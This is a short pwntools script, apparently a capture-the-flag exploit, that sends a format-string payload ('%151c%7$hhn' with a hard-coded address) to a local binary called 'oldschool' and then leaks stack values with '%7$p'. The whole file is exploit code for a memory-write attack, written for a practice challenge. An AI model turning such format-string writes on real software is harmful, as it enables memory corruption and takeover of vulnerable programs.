from pwn import *
def main():
	payload = "\xdc\x96\x04\x08%151c%7$hhn"
	p = process('./oldschool')
	p.sendline(payload)
	p.sendline("AAAA.%7$p")
	print p.recvall()
	p.sendline("BBBB.%7$p")
	print p.recvall()
	pass
main()
